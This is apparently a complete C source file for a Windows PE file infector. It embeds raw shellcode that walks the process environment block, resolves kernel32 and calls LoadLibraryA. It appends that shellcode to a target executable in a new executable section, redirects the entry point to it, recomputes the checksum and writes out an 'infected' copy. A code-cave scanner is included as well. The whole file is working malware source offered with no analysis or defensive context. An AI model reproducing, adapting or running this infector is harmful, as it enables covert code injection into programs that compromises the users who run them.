#include <Windows.h>
#include <stdio.h>
#include <Imagehlp.h>


unsigned char ucShellCode[] = {0x55,0x8B,0xEC,0x81,0xEC,0xA8,0x00,0x00,0x00,0x53,0x56,0x57,0x64,0xA1,0x30,0x00,0x00,0x00,0x8B,0x40,0x0C,0xB9,0x4B,0x00,0x00,0x00,0x8B,0x40,0x0C,0x66,0x89,0x8D,0x58,0xFF,0xFF,0xFF,0xBA,0x45,0x00,0x00,0x00,0x66,0x89,0x95,0x5A,0xFF,0xFF,0xFF,0xB9,0x52,0x00,0x00,0x00,0x66,0x89,0x8D,0x5C,0xFF,0xFF,0xFF,0xB9,0x4E,0x00,0x00,0x00,0x66,0x89,0x8D,0x5E,0xFF,0xFF,0xFF,0x66,0x89,0x95,0x60,0xFF,0xFF,0xFF,0xBA,0x4C,0x00,0x00,0x00,0x66,0x89,0x95,0x62,0xFF,0xFF,0xFF,0xBB,0x33,0x00,0x00,0x00,0x66,0x89,0x9D,0x64,0xFF,0xFF,0xFF,0xBF,0x32,0x00,0x00,0x00,0x66,0x89,0xBD,0x66,0xFF,0xFF,0xFF,0xBE,0x2E,0x00,0x00,0x00,0x66,0x89,0xB5,0x68,0xFF,0xFF,0xFF,0xB9,0x44,0x00,0x00,0x00,0x66,0x89,0x8D,0x6A,0xFF,0xFF,0xFF,0x66,0x89,0x95,0x6C,0xFF,0xFF,0xFF,0x66,0x89,0x95,0x6E,0xFF,0xFF,0xFF,0x33,0xC9,0x66,0x89,0x8D,0x70,0xFF,0xFF,0xFF,0xB9,0x6B,0x00,0x00,0x00,0x66,0x89,0x4D,0x98,0xBA,0x65,0x00,0x00,0x00,0x66,0x89,0x55,0x9A,0xB9,0x72,0x00,0x00,0x00,0x66,0x89,0x4D,0x9C,0xB9,0x6E,0x00,0x00,0x00,0x66,0x89,0x4D,0x9E,0x66,0x89,0x55,0xA0,0xBA,0x6C,0x00,0x00,0x00,0x66,0x89,0x55,0xA2,0x66,0x89,0x5D,0xA4,0x66,0x89,0x7D,0xA6,0x66,0x89,0x75,0xA8,0xB9,0x64,0x00,0x00,0x00,0x66,0x89,0x4D,0xAA,0x66,0x89,0x55,0xAC,0x66,0x89,0x55,0xAE,0x33,0xC9,0x66,0x89,0x4D,0xB0,0xC6,0x45,0xE4,0x4C,0xC6,0x45,0xE5,0x6F,0xC6,0x45,0xE6,0x61,0xC6,0x45,0xE7,0x64,0xC6,0x45,0xE8,0x4C,0xC6,0x45,0xE9,0x69,0xC6,0x45,0xEA,0x62,0xC6,0x45,0xEB,0x72,0xC6,0x45,0xEC,0x61,0xC6,0x45,0xED,0x72,0xC6,0x45,0xEE,0x79,0xC6,0x45,0xEF,0x41,0x88,0x4D,0xF0,0xC6,0x45,0xF4,0x74,0xC6,0x45,0xF5,0x2E,0xC6,0x45,0xF6,0x64,0x88,0x55,0xF7,0x88,0x55,0xF8,0x89,0x45,0xE0,0x89,0x45,0xFC,0xC7,0x45,0xDC,0x00,0x00,0x00,0x00,0x88,0x4D,0xF9,0xEB,0x03,0x8D,0x49,0x00,0x0F,0xB7,0x78,0x2C,0x8B,0x40,0x30,0x8B,0xDF,0x8B,0xD0,0x8D,0x75,0x98,0x83,0xEB,0x04,0x72,0x11,0x8B,0x0A,0x3B,0x0E,0x75,0x14,0x83,0xC2,0x04,0x83,0xC6,0x04,0x83,0xEB,0x04,0x73,0xEF,0x83,0xFB,0xFC,0x0F,0x84,0xAA,0x00,0x00,0x00,0x8A,0x0A,0x3A,0x0E,0x75,0x2F,0x83,0xFB,0xFD,0x0F,0x84,0x9B,0x00,0x00,0x00,0x8A,0x4A,0x01,0x3A,0x4E,0x01,0x75,0x1E,0x83,0xFB,0xFE,0x0F,0x84,0x8A,0x00,0x00,0x00,0x8A,0x4A,0x02,0x3A,0x4E,0x02,0x75,0x0D,0x83,0xFB,0xFF,0x74,0x7D,0x8A,0x4A,0x03,0x3A,0x4E,0x03,0x74,0x75,0x8D,0x95,0x58,0xFF,0xFF,0xFF,0x83,0xEF,0x04,0x72,0x14,0x8D,0x49,0x00,0x8B,0x08,0x3B,0x0A,0x75,0x10,0x83,0xC0,0x04,0x83,0xC2,0x04,0x83,0xEF,0x04,0x73,0xEF,0x83,0xFF,0xFC,0x74,0x51,0x8A,0x08,0x3A,0x0A,0x75,0x27,0x83,0xFF,0xFD,0x74,0x46,0x8A,0x48,0x01,0x3A,0x4A,0x01,0x75,0x1A,0x83,0xFF,0xFE,0x74,0x39,0x8A,0x48,0x02,0x3A,0x4A,0x02,0x75,0x0D,0x83,0xFF,0xFF,0x74,0x2C,0x8A,0x40,0x03,0x3A,0x42,0x03,0x74,0x24,0x8B,0x45,0xFC,0x8B,0x00,0x89,0x45,0xFC,0x39,0x45,0xE0,0x74,0x0E,0x85,0xC0,0x74,0x0A,0x83,0x78,0x30,0x00,0x0F,0x85,0x32,0xFF,0xFF,0xFF,0x5F,0x5E,0x33,0xC0,0x5B,0x8B,0xE5,0x5D,0xC3,0x8B,0x45,0xFC,0x8B,0x78,0x18,0x85,0xFF,0x74,0xED,0x8B,0x47,0x3C,0x33,0xF6,0x8B,0x44,0x38,0x78,0x03,0xC7,0x8B,0x50,0x18,0x8B,0x48,0x1C,0x8B,0x58,0x20,0x8B,0x40,0x24,0x03,0xCF,0x03,0xC7,0x03,0xDF,0x89,0x55,0xD8,0x89,0x4D,0xFC,0x89,0x45,0xE0,0x85,0xD2,0x7E,0xC3,0xEB,0x03,0x8D,0x49,0x00,0x8B,0x04,0xB3,0x8D,0x4D,0xE4,0x03,0xC7,0x8A,0x10,0x3A,0x11,0x75,0x1A,0x84,0xD2,0x74,0x12,0x8A,0x50,0x01,0x3A,0x51,0x01,0x75,0x0E,0x83,0xC0,0x02,0x83,0xC1,0x02,0x84,0xD2,0x75,0xE4,0x33,0xC0,0xEB,0x05,0x1B,0xC0,0x83,0xC8,0x01,0x85,0xC0,0x75,0x1A,0x8B,0x45,0xE0,0x8B,0x4D,0xFC,0x0F,0xB7,0x04,0x70,0x8B,0x04,0x81,0x8B,0x4D,0xDC,0x03,0xC7,0x0F,0x45,0xC8,0x89,0x4D,0xDC,0xEB,0x03,0x8B,0x4D,0xDC,0x46,0x3B,0x75,0xD8,0x7C,0xAC,0x85,0xC9,0x0F,0x84,0x62,0xFF,0xFF,0xFF,0x8D,0x45,0xF4,0x50,0xFF,0xD1,0x5F,0x5E,0xB8,0x01,0x00,0x00,0x00,0x5B,0x8B,0xE5,0x5D,0xC3};
unsigned char ucCallCode[] = {0xE8,0x05,0x00,0x00,0x00};
unsigned char ucJMP[] = {0xE9, 0x00, 0x00, 0x00 ,0x00};


unsigned long CalculateBoundary(unsigned long Boundary, unsigned long Operand)
{
	return ((Operand + Boundary - 1)/Boundary) * Boundary;
}


unsigned long CreateFileBuffer(const char* szFileName, void** lpBase)
{
	HANDLE hFile = CreateFileA(szFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, NULL);
	unsigned long ulBufferSize = 0;

	if (hFile != INVALID_HANDLE_VALUE)
	{

		if (ulBufferSize = GetFileSize(hFile, 0))
		{
			void* lpBuffer = VirtualAlloc(NULL,ulBufferSize,MEM_COMMIT|MEM_RESERVE,0x40);


			if (lpBuffer)
			{

				if (ReadFile(hFile,lpBuffer,ulBufferSize,&ulBufferSize,0))
				{
					*lpBase = lpBuffer;
				}
				else
				{
					VirtualFree(lpBuffer,ulBufferSize,MEM_RELEASE);
				}
			}
		}
		CloseHandle(hFile);
	}


	return ulBufferSize;
}

unsigned long WriteFileBuffer(const char* szFileName, void* lpBuffer, unsigned long ulBuffer)
{
	HANDLE hFile = CreateFileA(szFileName, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, NULL);
	unsigned long ulWrittenBytes = 0;
	if (hFile != INVALID_HANDLE_VALUE)
	{
		WriteFile(hFile,lpBuffer,ulBuffer,&ulWrittenBytes,0);
		CloseHandle(hFile);
	}
	return ulWrittenBytes;
}



__declspec(naked) void* m_memcpy (void* Dst, void* src, int len)
{


	__asm
	{
		push edi
			push esi
			mov ecx, dword ptr[esp+20]
		mov esi, dword ptr[esp+16]
		mov edi, dword ptr [esp+12]
		rep movsb
			pop esi
			pop edi
			ret

	}

}


unsigned long GetEOFSize(PIMAGE_SECTION_HEADER lpLastSection, unsigned long ulFileSize)
{
	return ulFileSize - (lpLastSection->PointerToRawData + lpLastSection->SizeOfRawData);
}

void AddSection(void* lpModule, unsigned long ulModule, unsigned long ulRawSize)
{
	PIMAGE_DOS_HEADER lpDos = (PIMAGE_DOS_HEADER)(lpModule);
	PIMAGE_NT_HEADERS lpNt = (PIMAGE_NT_HEADERS)((unsigned long)lpDos + lpDos->e_lfanew);

	if (lpNt->Signature == IMAGE_NT_SIGNATURE)
	{
		unsigned long ulNewImageSize = ulModule + CalculateBoundary(lpNt->OptionalHeader.FileAlignment, ulRawSize);
		if (ulNewImageSize)
		{

			void * lpNewBase = VirtualAlloc(NULL,ulNewImageSize,MEM_COMMIT|MEM_RESERVE,0x40);

			if (lpNewBase)
			{
				PIMAGE_SECTION_HEADER lpLastSection = (PIMAGE_SECTION_HEADER)((unsigned long)lpNewBase + lpDos->e_lfanew + sizeof(IMAGE_NT_HEADERS) + ((lpNt->FileHeader.NumberOfSections-1)*40));
				PIMAGE_SECTION_HEADER lpNewSection = (PIMAGE_SECTION_HEADER)((unsigned long)lpLastSection + sizeof(IMAGE_SECTION_HEADER));

				unsigned long ulEOF = 0;
				unsigned long ulCheckSum = 0;
				unsigned long ulOldCheckSum = 0;
				unsigned long ulEntryPoint = 0;
				unsigned long ulOffset = 0;


				lpNt = (PIMAGE_NT_HEADERS)((unsigned long)lpNewBase+ lpDos->e_lfanew);

				RtlSecureZeroMemory(lpNewBase,ulNewImageSize);

				m_memcpy(lpNewBase,lpModule,ulModule);
				m_memcpy(&lpNewSection->Name, ".stdio", strlen(".stdio"));


				lpNewSection->SizeOfRawData = CalculateBoundary(lpNt->OptionalHeader.FileAlignment,ulRawSize);
				lpNewSection->PointerToRawData = CalculateBoundary(lpNt->OptionalHeader.FileAlignment, lpLastSection->PointerToRawData + lpLastSection->SizeOfRawData);
				lpNewSection->VirtualAddress = CalculateBoundary(lpNt->OptionalHeader.SectionAlignment, lpLastSection->VirtualAddress + lpLastSection->Misc.VirtualSize);
				lpNewSection->Characteristics = (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ);
				lpNewSection->Misc.VirtualSize = ulRawSize;
				lpNt->FileHeader.NumberOfSections++;
				lpNt->OptionalHeader.SizeOfImage = CalculateBoundary(lpNt->OptionalHeader.SectionAlignment, lpNewSection->VirtualAddress + ulRawSize);




				ulEntryPoint = lpNt->OptionalHeader.AddressOfEntryPoint;


				m_memcpy((void*)((unsigned long)lpNewBase + lpNewSection->PointerToRawData), ucCallCode, sizeof(ucCallCode));
				ulOffset = ulEntryPoint - (lpNewSection->VirtualAddress + sizeof(ucCallCode)) - 5;
				m_memcpy(&ucJMP[1],&ulOffset, sizeof(unsigned long));
				m_memcpy((void*)((unsigned long)lpNewBase + lpNewSection->PointerToRawData + sizeof(ucCallCode)), ucJMP,sizeof(ucJMP));
				m_memcpy((void*)((unsigned long)lpNewBase + lpNewSection->PointerToRawData + sizeof(ucCallCode) + sizeof(ucJMP)), ucShellCode, sizeof(ucShellCode));

				if (ulEOF = GetEOFSize(lpLastSection, ulModule))
				{
					m_memcpy((void*)((unsigned long)lpNewBase + lpNewSection->PointerToRawData + lpNewSection->SizeOfRawData), (void*)((unsigned long)lpModule + (lpLastSection->PointerToRawData + lpLastSection->SizeOfRawData)), ulEOF);
				}

				lpNt->OptionalHeader.AddressOfEntryPoint = (lpNewSection->VirtualAddress);

				if (CheckSumMappedFile(lpNewBase,ulNewImageSize, &ulOldCheckSum, &ulCheckSum))
				{

					lpNt->OptionalHeader.CheckSum = ulCheckSum;
				}



				if (WriteFileBuffer("NTTITON.exe",lpNewBase,ulNewImageSize))
				{
					printf("infected teh pe\n");

				}



				VirtualFree(lpNewBase,ulNewImageSize,MEM_RELEASE);
			}
		}
	}
}

unsigned long ScanCodeCave(void* lpBase, unsigned long ulBase, unsigned long ulSize)
{
	PIMAGE_DOS_HEADER lpDos = (PIMAGE_DOS_HEADER)(lpBase);
	PIMAGE_NT_HEADERS lpNt = (PIMAGE_NT_HEADERS)((unsigned long)lpDos + lpDos->e_lfanew);

	unsigned long ulCodeCave = 0;
	if (lpNt->Signature == IMAGE_NT_SIGNATURE)
	{
		PIMAGE_SECTION_HEADER lpSection = 0;
		unsigned short usSections = lpNt->FileHeader.NumberOfSections;
		unsigned short i = 0;
	

		for (i; i < usSections; i++)
		{
			unsigned long ulStart = 0;
			unsigned long a = 0;
			unsigned long ulCounter = 0;
			unsigned long ulInitial = 0;


			lpSection = (PIMAGE_SECTION_HEADER)((unsigned long)lpNt + sizeof(IMAGE_NT_HEADERS) + (i*40));
			ulStart = lpSection->PointerToRawData + (unsigned long)lpBase;


			printf("Scanning %s\n", lpSection->Name);



			for (a; a < lpSection->SizeOfRawData; a++)
			{
				unsigned char ucByte = *(unsigned char*)(ulStart + a);

				if (ucByte == 0x00 || ucByte == 0x90)
				{
					if (!ulInitial)
					{
						ulInitial = a;
					}

					++ulCounter;
				}
				else
				{
					if (ulCounter > 0)
					{
						unsigned long ulEnd = (ulCounter + ulInitial);
						printf("Found memory size %d at offset %2X\n", ulEnd - ulInitial, (ulStart + ulInitial) - (unsigned long)lpBase);
						ulInitial = 0;
						ulCounter = 0;
					}
					
				}

				if (a == (lpSection->SizeOfRawData - 1))
				{
					if (ulCounter > 0)
					{
						unsigned long ulEnd = (ulCounter + ulInitial);
						printf("Found memory size %d at offset %2X\n", ulEnd - ulInitial, (ulStart + ulInitial) - (unsigned long)lpBase);
					}
				}
			}
		}
	}
	return ulCodeCave;
}

int main(int argc, char* argv[])
{

	void* lpBuffer = 0;
	unsigned long ulBuffer = CreateFileBuffer(argv[1], &lpBuffer);
	if (lpBuffer)
	{
		if (ulBuffer)
		{
			AddSection(lpBuffer,ulBuffer, sizeof(ucShellCode) + 10);
			//ScanCodeCave(lpBuffer,ulBuffer,700);


		}
		VirtualFree(lpBuffer,ulBuffer,MEM_RELEASE);
	}


	fgetc(stdin);
	return 0;
}
